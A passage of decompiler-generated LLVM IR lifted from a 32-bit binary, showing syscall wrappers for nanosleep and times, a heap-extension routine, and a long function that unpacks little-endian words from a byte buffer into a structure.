  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_153fc, label %dec_label_pc_153e8

dec_label_pc_153e8:                               ; preds = %dec_label_pc_153b8
  %v0_153e8 = call i32 @function_13c28()
  %v0_153ec = load i32, i32* %r4.global-to-local, align 4
  %v1_153ec = sub i32 0, %v0_153ec
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_153f4 = inttoptr i32 %v0_153e8 to i32*
  store i32 %v1_153ec, i32* %v2_153f4, align 4
  %v0_15404.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15404

dec_label_pc_153fc:                               ; preds = %dec_label_pc_153b8
  %v2_153fc = icmp eq i32 %arg1, 0
  br i1 %v2_153fc, label %dec_label_pc_15410, label %dec_label_pc_15404

dec_label_pc_15404:                               ; preds = %dec_label_pc_153fc, %dec_label_pc_153e8
  %v0_15404 = phi i32 [ %arg1, %dec_label_pc_153fc ], [ %v0_15404.pre, %dec_label_pc_153e8 ]
  br label %dec_label_pc_15414

dec_label_pc_15410:                               ; preds = %dec_label_pc_153fc
  br label %dec_label_pc_15414

dec_label_pc_15414:                               ; preds = %dec_label_pc_15404, %dec_label_pc_15410
  %v14_15418 = phi i32 [ %v0_15404, %dec_label_pc_15404 ], [ %tmp9, %dec_label_pc_15410 ]
  ret i32 %v14_15418

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_15414, { 1, 0 }
}

define i32 @function_1541c(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1541c:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to %timespec*
  %stack_var_-8 = alloca i32, align 4
  %v3_1541c = load i32, i32* @r4, align 4
  store i32 %v3_1541c, i32* %stack_var_-8, align 4
  %v6_15420 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp)
  store i32 %v6_15420, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v6_15420, -4095
  br i1 %tmp6, label %dec_label_pc_15440, label %dec_label_pc_15430

dec_label_pc_15430:                               ; preds = %dec_label_pc_1541c
  %v0_15430 = call i32 @function_13c28()
  %v0_15434 = load i32, i32* %r4.global-to-local, align 4
  %v1_15434 = sub i32 0, %v0_15434
  %v2_15438 = inttoptr i32 %v0_15430 to i32*
  store i32 %v1_15434, i32* %v2_15438, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15440

dec_label_pc_15440:                               ; preds = %dec_label_pc_1541c, %dec_label_pc_15430
  %v0_15440 = phi i32 [ %v6_15420, %dec_label_pc_1541c ], [ -1, %dec_label_pc_15430 ]
  %v2_15444 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15444, i32* %r4.global-to-local, align 4
  ret i32 %v0_15440

; uselistorder directives
  uselistorder i32 %v6_15420, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15440, { 1, 0 }
}

define i32 @function_15448(i32 %arg1) local_unnamed_addr {
dec_label_pc_15448:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15448 = load i32, i32* @r4, align 4
  store i32 %v3_15448, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_1ec78.696 to i32), i32* %r4.global-to-local, align 4
  %v2_15450 = load i32, i32* @global_var_1ec78.696, align 4
  %v2_15454 = icmp eq i32 %v2_15450, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_15454, label %dec_label_pc_15464, label %dec_label_pc_15470

dec_label_pc_15464:                               ; preds = %dec_label_pc_15448
  %v2_15464 = call i32 @function_15e50(i32* null)
  %v1_15468 = icmp slt i32 %v2_15464, 0
  br i1 %v1_15468, label %dec_label_pc_15490, label %dec_label_pc_15470thread-pre-split

dec_label_pc_15470thread-pre-split:               ; preds = %dec_label_pc_15464
  %v0_15474.pr = load i32, i32* %r5.global-to-local, align 4
  %v2_15470.pre = load i32, i32* @global_var_1ec78.696, align 4
  br label %dec_label_pc_15470

dec_label_pc_15470:                               ; preds = %dec_label_pc_15470thread-pre-split, %dec_label_pc_15448
  %v2_15470 = phi i32 [ %v2_15470.pre, %dec_label_pc_15470thread-pre-split ], [ %v2_15450, %dec_label_pc_15448 ]
  %v1_1547c = phi i32 [ %v0_15474.pr, %dec_label_pc_15470thread-pre-split ], [ %arg1, %dec_label_pc_15448 ]
  %v2_15474 = icmp eq i32 %v1_1547c, 0
  store i32 %v2_15470, i32* %r4.global-to-local, align 4
  br i1 %v2_15474, label %dec_label_pc_15494, label %dec_label_pc_15484

dec_label_pc_15484:                               ; preds = %dec_label_pc_15470
  %v2_1547c = add i32 %v1_1547c, %v2_15470
  %v1_15484 = inttoptr i32 %v2_1547c to i32*
  %v2_15484 = call i32 @function_15e50(i32* %v1_15484)
  %v1_15488 = icmp slt i32 %v2_15484, 0
  br i1 %v1_15488, label %dec_label_pc_15490, label %dec_label_pc_15484.dec_label_pc_15494_crit_edge

dec_label_pc_15484.dec_label_pc_15494_crit_edge:  ; preds = %dec_label_pc_15484
  %v0_15494.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15494

dec_label_pc_15490:                               ; preds = %dec_label_pc_15484, %dec_label_pc_15464
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15494

dec_label_pc_15494:                               ; preds = %dec_label_pc_15484.dec_label_pc_15494_crit_edge, %dec_label_pc_15470, %dec_label_pc_15490
  %v0_15494 = phi i32 [ %v0_15494.pre, %dec_label_pc_15484.dec_label_pc_15494_crit_edge ], [ %v2_15470, %dec_label_pc_15470 ], [ -1, %dec_label_pc_15490 ]
  %v2_15498 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15498, i32* @r4, align 4
  ret i32 %v0_15494

; uselistorder directives
  uselistorder i32 %v2_15470, { 1, 0, 2 }
  uselistorder i32* null, { 0, 3, 7, 39, 40, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 1, 19, 20, 21, 2, 22, 26, 25, 24, 23, 38, 6, 27, 28, 29, 36, 30, 31, 32, 33, 34, 35, 5, 37 }
  uselistorder label %dec_label_pc_15494, { 2, 0, 1 }
}

define i32 @function_154a0(%tms* %arg1) local_unnamed_addr {
dec_label_pc_154a0:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_154a0 = load i32, i32* @r4, align 4
  store i32 %v3_154a0, i32* %stack_var_-8, align 4
  %v3_154a4 = call i32 @times(%tms* %arg1)
  store i32 %v3_154a4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_154a4, -4095
  br i1 %tmp, label %dec_label_pc_154c4, label %dec_label_pc_154b4

dec_label_pc_154b4:                               ; preds = %dec_label_pc_154a0
  %v0_154b4 = call i32 @function_13c28()
  %v0_154b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_154b8 = sub i32 0, %v0_154b8
  %v2_154bc = inttoptr i32 %v0_154b4 to i32*
  store i32 %v1_154b8, i32* %v2_154bc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_154c4

dec_label_pc_154c4:                               ; preds = %dec_label_pc_154a0, %dec_label_pc_154b4
  %v0_154c4 = phi i32 [ %v3_154a4, %dec_label_pc_154a0 ], [ -1, %dec_label_pc_154b4 ]
  %v2_154c8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_154c8, i32* %r4.global-to-local, align 4
  ret i32 %v0_154c4

; uselistorder directives
  uselistorder i32 %v3_154a4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_154c4, { 1, 0 }
}

define i32 @function_154cc(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_154cc:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 96, i32* @r2, align 4
  %v2_154e8 = inttoptr i32 %arg2 to i8*
  %v3_154e8 = call i32 @function_13c90(i8* %v2_154e8, i32 0)
  %v1_154ec = add i32 %tmp, 1
  %v2_154ec = inttoptr i32 %v1_154ec to i8*
  %v3_154ec = load i8, i8* %v2_154ec, align 1
  %v4_154ec = zext i8 %v3_154ec to i32
  %v1_154f0 = add i32 %tmp, 5
  %v2_154f0 = inttoptr i32 %v1_154f0 to i8*
  %v3_154f0 = load i8, i8* %v2_154f0, align 1
  %v4_154f0 = zext i8 %v3_154f0 to i32
  %v2_154f4 = load i8, i8* %arg1, align 1
  %v3_154f4 = zext i8 %v2_154f4 to i32
  %v1_154f8 = add i32 %tmp, 4
  %v2_154f8 = inttoptr i32 %v1_154f8 to i8*
  %v3_154f8 = load i8, i8* %v2_154f8, align 1
  %v4_154f8 = zext i8 %v3_154f8 to i32
  %v1_154fc = add i32 %tmp, 2
  %v2_154fc = inttoptr i32 %v1_154fc to i8*
  %v3_154fc = load i8, i8* %v2_154fc, align 1
  %v4_154fc = zext i8 %v3_154fc to i32
  %v1_15500 = add i32 %tmp, 6
  %v2_15500 = inttoptr i32 %v1_15500 to i8*
  %v3_15500 = load i8, i8* %v2_15500, align 1
  %v4_15500 = zext i8 %v3_15500 to i32
  %v1_15504 = add i32 %tmp, 3
  %v2_15504 = inttoptr i32 %v1_15504 to i8*
  %v3_15504 = load i8, i8* %v2_15504, align 1
  %v4_15504 = zext i8 %v3_15504 to i32
  %v4_15508 = mul nuw nsw i32 %v4_154ec, 256
  %v5_15508 = or i32 %v3_154f4, %v4_15508
  %v4_1550c = mul nuw nsw i32 %v4_154f0, 256
  %v5_1550c = or i32 %v4_154f8, %v4_1550c
  %v1_15510 = add i32 %tmp, 7
  %v2_15510 = inttoptr i32 %v1_15510 to i8*
  %v3_15510 = load i8, i8* %v2_15510, align 1
  %v4_15510 = zext i8 %v3_15510 to i32
  %v4_15514 = mul nuw nsw i32 %v4_154fc, 65536
  %v5_15514 = or i32 %v4_15514, %v5_15508
  %v4_15518 = mul nuw nsw i32 %v4_15500, 65536
  %v5_15518 = or i32 %v4_15518, %v5_1550c
  %v4_1551c = mul nuw i32 %v4_15504, 16777216
  %v5_1551c = or i32 %v4_1551c, %v5_15514
  %v4_15520 = mul nuw i32 %v4_15510, 16777216
  %v5_15520 = or i32 %v4_15520, %v5_15518
  store i32 %v5_15520, i32* %r3.global-to-local, align 4
  %v0_15524 = load i32, i32* %r7.global-to-local, align 4
  %v1_15524 = inttoptr i32 %v0_15524 to i32*
  store i32 %v5_1551c, i32* %v1_15524, align 4
  %v3_15524 = add i32 %v0_15524, 4
  %v4_15524 = inttoptr i32 %v3_15524 to i32*
  %v5_15524 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_15524, i32* %v4_15524, align 4
  %v0_15528 = load i32, i32* %r4.global-to-local, align 4
  %v1_15528 = add i32 %v0_15528, 89
  %v2_15528 = inttoptr i32 %v1_15528 to i8*
  %v3_15528 = load i8, i8* %v2_15528, align 1
  %v4_15528 = zext i8 %v3_15528 to i32
  %v1_1552c = add i32 %v0_15528, 93
  %v2_1552c = inttoptr i32 %v1_1552c to i8*
  %v3_1552c = load i8, i8* %v2_1552c, align 1
  %v4_1552c = zext i8 %v3_1552c to i32
  %v1_15530 = add i32 %v0_15528, 88
  %v2_15530 = inttoptr i32 %v1_15530 to i8*
  %v3_15530 = load i8, i8* %v2_15530, align 1
  %v4_15530 = zext i8 %v3_15530 to i32
  %v1_15534 = add i32 %v0_15528, 92
  %v2_15534 = inttoptr i32 %v1_15534 to i8*
  %v3_15534 = load i8, i8* %v2_15534, align 1
  %v4_15534 = zext i8 %v3_15534 to i32
  store i32 %v4_15534, i32* %r3.global-to-local, align 4
  %v1_15538 = add i32 %v0_15528, 94
  %v2_15538 = inttoptr i32 %v1_15538 to i8*
  %v3_15538 = load i8, i8* %v2_15538, align 1
  %v4_15538 = zext i8 %v3_15538 to i32
  %v1_1553c = add i32 %v0_15528, 90
  %v2_1553c = inttoptr i32 %v1_1553c to i8*
  %v3_1553c = load i8, i8* %v2_1553c, align 1
  %v4_1553c = zext i8 %v3_1553c to i32
  %v1_15540 = add i32 %v0_15528, 91
  %v2_15540 = inttoptr i32 %v1_15540 to i8*
  %v3_15540 = load i8, i8* %v2_15540, align 1
  %v4_15540 = zext i8 %v3_15540 to i32
  %v4_15544 = mul nuw nsw i32 %v4_15528, 256
  %v5_15544 = or i32 %v4_15530, %v4_15544
  %v4_15548 = mul nuw nsw i32 %v4_1552c, 256
  %v5_15548 = or i32 %v4_15534, %v4_15548
  store i32 %v5_15548, i32* %r3.global-to-local, align 4
  %v1_1554c = add i32 %v0_15528, 95
  %v2_1554c = inttoptr i32 %v1_1554c to i8*
  %v3_1554c = load i8, i8* %v2_1554c, align 1
  %v4_1554c = zext i8 %v3_1554c to i32
  %v4_15550 = mul nuw nsw i32 %v4_15538, 65536
  %v5_15550 = or i32 %v4_15550, %v5_15548
  store i32 %v5_15550, i32* %r3.global-to-local, align 4
  %v4_15554 = mul nuw nsw i32 %v4_1553c, 65536
  %v5_15554 = or i32 %v4_15554, %v5_15544
  %v4_15558 = mul nuw i32 %v4_15540, 16777216
  %v5_15558 = or i32 %v4_15558, %v5_15554
  %v4_1555c = mul nuw i32 %v4_1554c, 16777216
  %v5_1555c = or i32 %v4_1555c, %v5_15550
  store i32 %v5_1555c, i32* %r6.global-to-local, align 4
  %v1_15560 = load i32, i32* %r7.global-to-local, align 4
  %v2_15560 = add i32 %v1_15560, 88
  %v3_15560 = inttoptr i32 %v2_15560 to i32*
  store i32 %v5_15558, i32* %v3_15560, align 4
  %v0_15564 = load i32, i32* %r6.global-to-local, align 4
  %v1_15564 = load i32, i32* %r7.global-to-local, align 4
  %v2_15564 = add i32 %v1_15564, 92
  %v3_15564 = inttoptr i32 %v2_15564 to i32*
  store i32 %v0_15564, i32* %v3_15564, align 4
  %v0_15568 = load i32, i32* %r4.global-to-local, align 4
  %v1_15568 = add i32 %v0_15568, 13
  %v2_15568 = inttoptr i32 %v1_15568 to i8*
  %v3_15568 = load i8, i8* %v2_15568, align 1
  %v4_15568 = zext i8 %v3_15568 to i32
  %v1_1556c = add i32 %v0_15568, 12
  %v2_1556c = inttoptr i32 %v1_1556c to i8*
  %v3_1556c = load i8, i8* %v2_1556c, align 1
  %v4_1556c = zext i8 %v3_1556c to i32
  store i32 %v4_1556c, i32* %r3.global-to-local, align 4
  %v1_15570 = add i32 %v0_15568, 14
  %v2_15570 = inttoptr i32 %v1_15570 to i8*
  %v3_15570 = load i8, i8* %v2_15570, align 1
  %v4_15570 = zext i8 %v3_15570 to i32
  %v4_15574 = mul nuw nsw i32 %v4_15568, 256
  %v5_15574 = or i32 %v4_1556c, %v4_15574
  store i32 %v5_15574, i32* %r3.global-to-local, align 4
  %v1_15578 = add i32 %v0_15568, 15
  %v2_15578 = inttoptr i32 %v1_15578 to i8*
  %v3_15578 = load i8, i8* %v2_15578, align 1
  %v4_15578 = zext i8 %v3_15578 to i32
  %v4_1557c = mul nuw nsw i32 %v4_15570, 65536
  %v5_1557c = or i32 %v4_1557c, %v5_15574
  %v4_15580 = mul nuw i32 %v4_15578, 16777216
  %v5_15580 = or i32 %v5_1557c, %v4_15580
  store i32 %v5_15580, i32* %r3.global-to-local, align 4
  %v1_15584 = load i32, i32* %r7.global-to-local, align 4
  %v2_15584 = add i32 %v1_15584, 12
  %v3_15584 = inttoptr i32 %v2_15584 to i32*
  store i32 %v5_15580, i32* %v3_15584, align 4
  %v0_15588 = load i32, i32* %r4.global-to-local, align 4
  %v1_15588 = add i32 %v0_15588, 17
  %v2_15588 = inttoptr i32 %v1_15588 to i8*
  %v3_15588 = load i8, i8* %v2_15588, align 1
  %v4_15588 = zext i8 %v3_15588 to i32
  %v1_1558c = add i32 %v0_15588, 16
  %v2_1558c = inttoptr i32 %v1_1558c to i8*
  %v3_1558c = load i8, i8* %v2_1558c, align 1
  %v4_1558c = zext i8 %v3_1558c to i32
  store i32 %v4_1558c, i32* %r3.global-to-local, align 4
  %v1_15590 = add i32 %v0_15588, 18
  %v2_15590 = inttoptr i32 %v1_15590 to i8*
  %v3_15590 = load i8, i8* %v2_15590, align 1
  %v4_15590 = zext i8 %v3_15590 to i32
  %v4_15594 = mul nuw nsw i32 %v4_15588, 256
  %v5_15594 = or i32 %v4_1558c, %v4_15594
  store i32 %v5_15594, i32* %r3.global-to-local, align 4
  %v1_15598 = add i32 %v0_15588, 19
  %v2_15598 = inttoptr i32 %v1_15598 to i8*
  %v3_15598 = load i8, i8* %v2_15598, align 1
  %v4_15598 = zext i8 %v3_15598 to i32
  %v4_1559c = mul nuw nsw i32 %v4_15590, 65536
  %v5_1559c = or i32 %v4_1559c, %v5_15594
  %v4_155a0 = mul nuw i32 %v4_15598, 16777216
  %v5_155a0 = or i32 %v5_1559c, %v4_155a0
  store i32 %v5_155a0, i32* %r3.global-to-local, align 4
  %v1_155a4 = load i32, i32* %r7.global-to-local, align 4
  %v2_155a4 = add i32 %v1_155a4, 16
  %v3_155a4 = inttoptr i32 %v2_155a4 to i32*
  store i32 %v5_155a0, i32* %v3_155a4, align 4
  %v0_155a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_155a8 = add i32 %v0_155a8, 21
  %v2_155a8 = inttoptr i32 %v1_155a8 to i8*
  %v3_155a8 = load i8, i8* %v2_155a8, align 1
  %v4_155a8 = zext i8 %v3_155a8 to i32
  %v1_155ac = add i32 %v0_155a8, 20
  %v2_155ac = inttoptr i32 %v1_155ac to i8*
  %v3_155ac = load i8, i8* %v2_155ac, align 1
  %v4_155ac = zext i8 %v3_155ac to i32
  store i32 %v4_155ac, i32* %r3.global-to-local, align 4
  %v1_155b0 = add i32 %v0_155a8, 22
  %v2_155b0 = inttoptr i32 %v1_155b0 to i8*
  %v3_155b0 = load i8, i8* %v2_155b0, align 1
  %v4_155b0 = zext i8 %v3_155b0 to i32
  %v4_155b4 = mul nuw nsw i32 %v4_155a8, 256
  %v5_155b4 = or i32 %v4_155ac, %v4_155b4
  store i32 %v5_155b4, i32* %r3.global-to-local, align 4
  %v1_155b8 = add i32 %v0_155a8, 23
  %v2_155b8 = inttoptr i32 %v1_155b8 to i8*
  %v3_155b8 = load i8, i8* %v2_155b8, align 1
  %v4_155b8 = zext i8 %v3_155b8 to i32
  %v4_155bc = mul nuw nsw i32 %v4_155b0, 65536
  %v5_155bc = or i32 %v4_155bc, %v5_155b4
  %v4_155c0 = mul nuw i32 %v4_155b8, 16777216
  %v5_155c0 = or i32 %v5_155bc, %v4_155c0
  store i32 %v5_155c0, i32* %r3.global-to-local, align 4
  %v1_155c4 = load i32, i32* %r7.global-to-local, align 4
  %v2_155c4 = add i32 %v1_155c4, 20
  %v3_155c4 = inttoptr i32 %v2_155c4 to i32*
  store i32 %v5_155c0, i32* %v3_155c4, align 4
  %v0_155c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_155c8 = add i32 %v0_155c8, 25
  %v2_155c8 = inttoptr i32 %v1_155c8 to i8*
  %v3_155c8 = load i8, i8* %v2_155c8, align 1
  %v4_155c8 = zext i8 %v3_155c8 to i32
  %v1_155cc = add i32 %v0_155c8, 24
  %v2_155cc = inttoptr i32 %v1_155cc to i8*
  %v3_155cc = load i8, i8* %v2_155cc, align 1
  %v4_155cc = zext i8 %v3_155cc to i32
  store i32 %v4_155cc, i32* %r3.global-to-local, align 4
  %v1_155d0 = add i32 %v0_155c8, 26
  %v2_155d0 = inttoptr i32 %v1_155d0 to i8*
  %v3_155d0 = load i8, i8* %v2_155d0, align 1
  %v4_155d0 = zext i8 %v3_155d0 to i32
  %v4_155d4 = mul nuw nsw i32 %v4_155c8, 256
  %v5_155d4 = or i32 %v4_155cc, %v4_155d4
  store i32 %v5_155d4, i32* %r3.global-to-local, align 4
  %v1_155d8 = add i32 %v0_155c8, 27
  %v2_155d8 = inttoptr i32 %v1_155d8 to i8*
  %v3_155d8 = load i8, i8* %v2_155d8, align 1
  %v4_155d8 = zext i8 %v3_155d8 to i32
  %v4_155dc = mul nuw nsw i32 %v4_155d0, 65536
  %v5_155dc = or i32 %v4_155dc, %v5_155d4
  %v4_155e0 = mul nuw i32 %v4_155d8, 16777216
  %v5_155e0 = or i32 %v5_155dc, %v4_155e0
  store i32 %v5_155e0, i32* %r3.global-to-local, align 4
  %v1_155e4 = load i32, i32* %r7.global-to-local, align 4
  %v2_155e4 = add i32 %v1_155e4, 24
  %v3_155e4 = inttoptr i32 %v2_155e4 to i32*
  store i32 %v5_155e0, i32* %v3_155e4, align 4
  %v0_155e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_155e8 = add i32 %v0_155e8, 29
  %v2_155e8 = inttoptr i32 %v1_155e8 to i8*
  %v3_155e8 = load i8, i8* %v2_155e8, align 1
  %v4_155e8 = zext i8 %v3_155e8 to i32
  %v1_155ec = add i32 %v0_155e8, 28
  %v2_155ec = inttoptr i32 %v1_155ec to i8*
  %v3_155ec = load i8, i8* %v2_155ec, align 1
  %v4_155ec = zext i8 %v3_155ec to i32
  store i32 %v4_155ec, i32* %r3.global-to-local, align 4
  %v1_155f0 = add i32 %v0_155e8, 30
  %v2_155f0 = inttoptr i32 %v1_155f0 to i8*
  %v3_155f0 = load i8, i8* %v2_155f0, align 1
  %v4_155f0 = zext i8 %v3_155f0 to i32
  %v4_155f4 = mul nuw nsw i32 %v4_155e8, 256
  %v5_155f4 = or i32 %v4_155ec, %v4_155f4
  store i32 %v5_155f4, i32* %r3.global-to-local, align 4
  %v1_155f8 = add i32 %v0_155e8, 31
  %v2_155f8 = inttoptr i32 %v1_155f8 to i8*
  %v3_155f8 = load i8, i8* %v2_155f8, align 1
  %v4_155f8 = zext i8 %v3_155f8 to i32
  %v4_155fc = mul nuw nsw i32 %v4_155f0, 65536
  %v5_155fc = or i32 %v4_155fc, %v5_155f4
  %v4_15600 = mul nuw i32 %v4_155f8, 16777216
  %v5_15600 = or i32 %v5_155fc, %v4_15600
  store i32 %v5_15600, i32* %r3.global-to-local, align 4
  %v1_15604 = load i32, i32* %r7.global-to-local, align 4
  %v2_15604 = add i32 %v1_15604, 28
  %v3_15604 = inttoptr i32 %v2_15604 to i32*
  store i32 %v5_15600, i32* %v3_15604, align 4
  %v0_15608 = load i32, i32* %r4.global-to-local, align 4
  %v1_15608 = add i32 %v0_15608, 33
  %v2_15608 = inttoptr i32 %v1_15608 to i8*
  %v3_15608 = load i8, i8* %v2_15608, align 1
  %v4_15608 = zext i8 %v3_15608 to i32
  %v1_1560c = add i32 %v0_15608, 37
  %v2_1560c = inttoptr i32 %v1_1560c to i8*
  %v3_1560c = load i8, i8* %v2_1560c, align 1
  %v4_1560c = zext i8 %v3_1560c to i32
  %v1_15610 = add i32 %v0_15608, 32
  %v2_15610 = inttoptr i32 %v1_15610 to i8*
  %v3_15610 = load i8, i8* %v2_15610, align 1
  %v4_15610 = zext i8 %v3_15610 to i32
  %v1_15614 = add i32 %v0_15608, 36
  %v2_15614 = inttoptr i32 %v1_15614 to i8*
  %v3_15614 = load i8, i8* %v2_15614, align 1
  %v4_15614 = zext i8 %v3_15614 to i32
  store i32 %v4_15614, i32* %r3.global-to-local, align 4
  %v1_15618 = add i32 %v0_15608, 34
  %v2_15618 = inttoptr i32 %v1_15618 to i8*
  %v3_15618 = load i8, i8* %v2_15618, align 1
  %v4_15618 = zext i8 %v3_15618 to i32
  %v1_1561c = add i32 %v0_15608, 38
  %v2_1561c = inttoptr i32 %v1_1561c to i8*
  %v3_1561c = load i8, i8* %v2_1561c, align 1
  %v4_1561c = zext i8 %v3_1561c to i32
  %v1_15620 = add i32 %v0_15608, 35
  %v2_15620 = inttoptr i32 %v1_15620 to i8*
  %v3_15620 = load i8, i8* %v2_15620, align 1
  %v4_15620 = zext i8 %v3_15620 to i32
  %v4_15624 = mul nuw nsw i32 %v4_15608, 256
  %v5_15624 = or i32 %v4_15610, %v4_15624
  %v4_15628 = mul nuw nsw i32 %v4_1560c, 256
  %v5_15628 = or i32 %v4_15614, %v4_15628
  store i32 %v5_15628, i32* %r3.global-to-local, align 4
  %v1_1562c = add i32 %v0_15608, 39
  %v2_1562c = inttoptr i32 %v1_1562c to i8*
  %v3_1562c = load i8, i8* %v2_1562c, align 1
  %v4_1562c = zext i8 %v3_1562c to i32
  %v4_15630 = mul nuw nsw i32 %v4_15618, 65536
  %v5_15630 = or i32 %v4_15630, %v5_15624
  %v4_15634 = mul nuw nsw i32 %v4_1561c, 65536
  %v5_15634 = or i32 %v4_15634, %v5_15628
  %v4_15638 = mul nuw i32 %v4_15620, 16777216
  %v5_15638 = or i32 %v5_15630, %v4_15638
  %v4_1563c = mul nuw i32 %v4_1562c, 16777216
  %v5_1563c = or i32 %v5_15634, %v4_1563c
  store i32 %v5_1563c, i32* %r3.global-to-local, align 4
  %v1_15650 = load i32, i32* %r7.global-to-local, align 4
  %v2_15650 = add i32 %v1_15650, 32
  %v3_15650 = inttoptr i32 %v2_15650 to i32*
  store i32 %v5_15638, i32* %v3_15650, align 4
  %v0_15654 = load i32, i32* %r3.global-to-local, align 4
  %v1_15654 = load i32, i32* %r7.global-to-local, align 4
  %v2_15654 = add i32 %v1_15654, 36
  %v3_15654 = inttoptr i32 %v2_15654 to i32*
  store i32 %v0_15654, i32* %v3_15654, align 4
  %v0_15658 = load i32, i32* %r4.global-to-local, align 4
  %v1_15658 = add i32 %v0_15658, 45
  %v2_15658 = inttoptr i32 %v1_15658 to i8*
  %v3_15658 = load i8, i8* %v2_15658, align 1
  %v4_15658 = zext i8 %v3_15658 to i32
  %v1_1565c = add i32 %v0_15658, 49
  %v2_1565c = inttoptr i32 %v1_1565c to i8*
  %v3_1565c = load i8, i8* %v2_1565c, align 1
  %v4_1565c = zext i8 %v3_1565c to i32
  %v1_15660 = add i32 %v0_15658, 44
  %v2_15660 = inttoptr i32 %v1_15660 to i8*
  %v3_15660 = load i8, i8* %v2_15660, align 1
  %v4_15660 = zext i8 %v3_15660 to i32
  %v1_15664 = add i32 %v0_15658, 48
  %v2_15664 = inttoptr i32 %v1_15664 to i8*
  %v3_15664 = load i8, i8* %v2_15664, align 1
  %v4_15664 = zext i8 %v3_15664 to i32
  store i32 %v4_15664, i32* %r3.global-to-local, align 4
  %v1_15668 = add i32 %v0_15658, 46
  %v2_15668 = inttoptr i32 %v1_15668 to i8*
  %v3_15668 = load i8, i8* %v2_15668, align 1
  %v4_15668 = zext i8 %v3_15668 to i32
  %v1_1566c = add i32 %v0_15658, 50
  %v2_1566c = inttoptr i32 %v1_1566c to i8*
  %v3_1566c = load i8, i8* %v2_1566c, align 1
  %v4_1566c = zext i8 %v3_1566c to i32
  %v1_15670 = add i32 %v0_15658, 47
  %v2_15670 = inttoptr i32 %v1_15670 to i8*
  %v3_15670 = load i8, i8* %v2_15670, align 1
  %v4_15670 = zext i8 %v3_15670 to i32
  %v4_15674 = mul nuw nsw i32 %v4_15658, 256
  %v5_15674 = or i32 %v4_15660, %v4_15674
  %v4_15678 = mul nuw nsw i32 %v4_1565c, 256
  %v5_15678 = or i32 %v4_15664, %v4_15678
  store i32 %v5_15678, i32* %r3.global-to-local, align 4
  %v1_1567c = add i32 %v0_15658, 51
  %v2_1567c = inttoptr i32 %v1_1567c to i8*
  %v3_1567c = load i8, i8* %v2_1567c, align 1
  %v4_1567c = zext i8 %v3_1567c to i32
  %v4_15680 = mul nuw nsw i32 %v4_15668, 65536
  %v5_15680 = or i32 %v4_15680, %v5_15674
  %v4_15684 = mul nuw nsw i32 %v4_1566c, 65536
  %v5_15684 = or i32 %v4_15684, %v5_15678
  %v4_15688 = mul nuw i32 %v4_15670, 16777216
  %v5_15688 = or i32 %v5_15680, %v4_15688
  %v4_1568c = mul nuw i32 %v4_1567c, 16777216
  %v5_1568c = or i32 %v5_15684, %v4_1568c
  store i32 %v5_1568c, i32* %r3.global-to-local, align 4
  %v1_156a0 = load i32, i32* %r7.global-to-local, align 4
  %v2_156a0 = add i32 %v1_156a0, 44
  %v3_156a0 = inttoptr i32 %v2_156a0 to i32*
  store i32 %v5_15688, i32* %v3_156a0, align 4
  %v0_156a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_156a4 = load i32, i32* %r7.global-to-local, align 4
  %v2_156a4 = add i32 %v1_156a4, 48
  %v3_156a4 = inttoptr i32 %v2_156a4 to i32*
  store i32 %v0_156a4, i32* %v3_156a4, align 4
  %v0_156a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_156a8 = add i32 %v0_156a8, 53
  %v2_156a8 = inttoptr i32 %v1_156a8 to i8*
  %v3_156a8 = load i8, i8* %v2_156a8, align 1
  %v4_156a8 = zext i8 %v3_156a8 to i32
  %v1_156ac = add i32 %v0_156a8, 52
  %v2_156ac = inttoptr i32 %v1_156ac to i8*
  %v3_156ac = load i8, i8* %v2_156ac, align 1
  %v4_156ac = zext i8 %v3_156ac to i32
  store i32 %v4_156ac, i32* %r3.global-to-local, align 4
  %v1_156b0 = add i32 %v0_156a8, 54
  %v2_156b0 = inttoptr i32 %v1_156b0 to i8*
  %v3_156b0 = load i8, i8* %v2_156b0, align 1
  %v4_156b0 = zext i8 %v3_156b0 to i32
  %v4_156b4 = mul nuw nsw i32 %v4_156a8, 256
  %v5_156b4 = or i32 %v4_156ac, %v4_156b4
  store i32 %v5_156b4, i32* %r3.global-to-local, align 4
  %v1_156b8 = add i32 %v0_156a8, 55
